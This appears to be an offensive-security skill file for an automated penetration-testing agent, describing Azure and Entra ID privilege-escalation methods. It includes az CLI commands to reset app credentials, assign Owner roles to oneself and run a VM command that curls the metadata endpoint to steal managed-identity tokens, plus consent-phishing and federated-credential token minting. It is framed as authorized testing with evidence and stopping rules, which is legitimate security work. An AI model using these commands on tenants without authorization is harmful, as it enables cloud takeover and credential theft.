---
name: azure-privilege-escalation
description: Azure and Entra ID privilege escalation — privileged Graph application permissions, application and service-principal ownership, credential addition, managed-identity abuse, role assignment capabilities, Key Vault control-plane mistakes, VM Run Command, Automation accounts, and federated identity credentials
intent: offensive
assessment_mode: credentialed
provider:
  - azure
---

# Azure / Entra Privilege Escalation

## Purpose
Prove Azure/Entra escalation from a controlled principal (discovered token, service principal, user, or managed identity) to higher privilege — a directory role, a privileged Graph app permission, an Owner/User Access Administrator RBAC role, or workload execution — with the formerly unavailable action demonstrated.

## Entry Conditions
- A validated Azure context from `azure-entra-cloud-pentesting` (principal, audience(s), roles/scopes enumerated)
- Runtime authorization for the state-changing operations this skill exercises

## Attack Model

```text
baseline: principal cannot do X (role assignment, secret creation, command execution)
→ escalation primitive (ownership / credential / role assignment / workload exec)
→ higher-privilege identity or direct control
→ X succeeds
→ report
```

## Methodology

### Family 1 — Application & Service Principal Control
```text
Owned apps/SPs: "Application.ReadWrite.Owner" / ownership grants let you add credentials
  (client secrets, cert) to the app. Adding a secret to a privileged app = full control of
  its identity. Check app roles:
  az rest --url "https://graph.microsoft.com/v1.0/applications/<id>" | jq .requiredResourceAccess
  az ad app credential list --id <appId>       # what creds exist
  az ad app credential reset --id <appId>      # (state change: runtime policy permitting)
Privileged Graph app roles (application permissions) on ANY app you can administer:
  RoleManagement.ReadWrite.Directory, Directory.ReadWrite.All, AppRoleAssignment.ReadWrite.All,
  Mail.ReadWrite, etc. — these act tenant-wide, not just for one user
```

### Family 2 — Role Assignments (RBAC and Directory)
```bash
# User Access Administrator / Owner on a scope → assign roles at that scope
az role assignment create --assignee <yourObjectId> --role "Owner" --scope /subscriptions/<id>
# Directory roles: Privileged Role Administrator / Global Admin paths
az rest --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"   # who holds what
az rest --url "https://graph.microsoft.com/v1.0/roleEligibilityScheduleInstances"          # PIM assignments
# Groups: group-ownership → membership control of role-bearing groups
```

### Family 3 — Managed Identity Abuse
```bash
# An identity you can control (VM, App Service, Function, Automation) can mint tokens
# for ANY resource audience its RBAC/Graph grants allow:
az identity list -g <rg>
az vm run-command invoke ... --scripts "curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"
# Contributor over a VM/MI-bearing resource = token minting = the identity's full privilege set
```

### Family 4 — Key Vault Control-Plane vs Data-Plane
- RBAC `Key Vault Contributor` on a vault = control plane = can grant yourself data-plane access via access policies (legacy model) or Key Vault Administrator (RBAC model)
- Vault access policies granting a principal `get` on keys/certs = private-key material (also JWT signing for app credentials)

### Family 5 — Workload Execution
- VM Run Command / extensions (`az vm run-command invoke`, `az vm extension set`)
- Automation accounts: runbooks + `automation credential` assets
- Azure DevOps/GitHub service connections reachable from the tenant (lateral to CI/CD)

### Family 6 — Federated Identity Credentials
```bash
# Apps with federated credentials allow token minting from an external issuer:
az rest --url "https://graph.microsoft.com/v1.0/applications/<id>/federatedIdentityCredentials"
# If you control the issuer/subject (e.g., a GitHub repo in the config), mint an Entra
# token AS the app — its app roles come with it
```

### Family 7 — Consent Grant Attacks
- An app with `AppRoleAssignment.ReadWrite.All` or a consenting privileged user = add tenant-wide grants
- Unverified publisher + admin consent flows as phishing-assisted escalation (chain into phishing skills where relevant)

## Evidence Contract

```text
escalation candidate (ownership/role/MI/federation observed)
→ audience/permission resolution (does the token really carry it?)
→ state change or token mint (credential added, role assigned, token obtained)
→ formerly unavailable action SUCCEEDS (directory object created, secret read, VM command output)
→ restore state where modified
→ report
```

**NOT evidence**: app registration listing with powerful API permissions NOT granted (admin consent pending), ownership without credential add, RBAC Contributor without data-plane demonstration, decoded token claims alone

## Common Misses
- Application permissions (app roles) vs delegated scopes conflated — app roles are tenant-wide
- PIM (just-in-time role eligibility) — the assignment list shows standing roles only
- Group ownership as an indirect path to role-bearing groups
- Key Vault access-policy model (legacy) granting key `get` (signing material!) without vault-admin roles
- Federated identity credentials never inspected
- Managed identities' per-audience token minting (the same MI reaches Graph AND ARM AND vaults)

## False Positives / Non-Findings
- API permissions requested in the manifest but never admin-consented
- Roles limited to a different subscription/scope
- CA policies blocking the escalation context
- Service principals disabled or credential-expired

## Xalgorix Tool Strategy
- `terminal_execute` with az CLI + `az rest` (Graph) throughout
- Python/MSAL for audience-specific token minting
- Ledger: candidate paths with tenant-wide vs scoped impact; before/after proof for each verified escalation

## Specialist Handoffs
- Cross-tenant apps and federations → `cloud-cross-account-tenant-trust`
- Secrets reached via new privilege → `cloud-secrets-data-access`
- Storage → `cloud-storage-exposure-testing`

## Stopping Rule
Depth-first on: application ownership/credentials > role assignment > managed-identity token minting > workload execution. Stop when tenant-wide or subscription-wide admin-equivalent impact is proven, or when the top families are constraint-resolved and blocked.